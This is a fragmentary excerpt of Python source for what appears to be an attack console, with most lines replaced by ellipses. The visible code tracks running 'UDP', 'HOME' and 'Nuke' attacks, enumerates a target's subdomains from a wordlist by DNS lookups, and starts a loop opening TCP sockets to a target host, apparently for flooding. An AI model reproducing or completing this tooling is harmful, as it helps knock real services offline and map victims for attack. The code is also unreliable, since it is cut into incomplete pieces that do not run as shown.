...
def main():
	...
	while True:
		...
		if sinput == "clear":
			...
			print ("Ⲕ ι 𝜏 ട ᥙ ɳ version: "+version+" ")
		elif sinput == "stats":
			...
			print ("\n[\033[91mⲔ ι 𝜏 \033[00m] UDP Running processes: {}".format (uaid))
			print ("[\033[91mⲔ ι 𝜏 \033[00m] HOME Running processes: {}".format (iaid))
			print ("[\033[91mⲔ ι 𝜏 \033[00m] Nuke Running processes: {}".format (said))
			print ("[\033[91mⲔ ι 𝜏 \033[00m] Total attacks running: {}\n".format (aid))
			main()
			...
			try:
				host = sin.split(" ")[1]
				with open(r"/usr/share/Ⲕ ι 𝜏 ട ᥙ ɳ/subnames.txt", "r") as sub:
					domains = sub.readlines()	
				for link in domains:
					try:
						url = link.strip() + "." + host
						subips = socket.gethostbyname(url)
						print ("[\033[91mⲔ ι 𝜏 \033[00m] Domain: https://{} \033[91m>\033[00m Converted: {} [\033[91mEXISTANT\033[00m]".format(url, subips))
						sfound += 1
						fsubs += 1
						sys.stdout.write("\x1b]2;Ⲕ ι 𝜏 ട ᥙ ɳ |{}| F O U N D\x07".format (sfound))
					except socket.error:
			...
			try:
				...
				try:
					...
					print ("[\033[91mⲔ ι 𝜏 \033[00m] Host un-resolvable")
					main()
				while True:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
